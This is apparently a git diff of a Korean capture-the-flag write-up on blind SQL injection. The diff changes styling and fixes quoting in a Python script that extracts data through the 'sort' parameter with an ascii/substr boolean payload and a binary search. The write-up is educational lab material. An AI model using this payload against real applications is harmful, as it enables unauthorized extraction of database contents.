@@ -252,7 +252,8 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 이로써 조건식의 진릿값에 따른 애플리케이션의 동작 차이를 확인하였다. 이번에는 데이터가 출력되는 위치를 확인할 수 없으므로, 바로 Blind SQL Injection을 사용하기로 결정하였다. 7주 차에 사용했던 자동화 스크립트를 소폭 수정하여 실행해 보았다.
 
 <style id="code-2">
-  #code-2 + pre data:is([value="17"], [value="20"]) span {color: #24292E !important;}
+  #code-2 + pre data[value="12"] span:is(:nth-of-type(15), :nth-of-type(17)) {color: #032F62 !important;}
+  #code-2 + pre data:is([value="16"], [value="19"]) span {color: #24292E !important;}
 </style>
 ```python
 # blind_sqli.py
@@ -266,8 +267,7 @@ def is_true(row, idx, asc):
     return False
   payload = f"(select 1 union select 2 where ascii(substr(({sql} limit {row}, 1), {idx}, 1)) > {asc})"
   cookie = {"PHPSESSID": "h1u9p1k1pg8sr0ii3gdac8m3k5"}
-  data = {"option_val": "username", "board_result": "any", "board_search":
-          "%F0%9F%94%8D", "date_from": "", "date_to": "", "sort": payload}
+  data = {"option_val": "username", "board_result": "any", "board_search": "%F0%9F%94%8D", "date_from": "", "date_to": "", "sort": payload}
   return "any" not in requests.post(url, cookies = cookie, data = data).text
 
 def find_char(row, idx, low = 32, high = 126):
@@ -280,7 +280,7 @@ while True:
   sql = input("Enter the SQL query to extract data.(Press 'q' to quit.)\nSQL > ")
   if sql == "q":
     break
-  print(f"[+] Data extracted: {", ".join(extract_data())}\n")
+  print(f"[+] Data extracted: {', '.join(extract_data())}\n")
 ```
 
 스크립트 실행 결과는 다음과 같다.
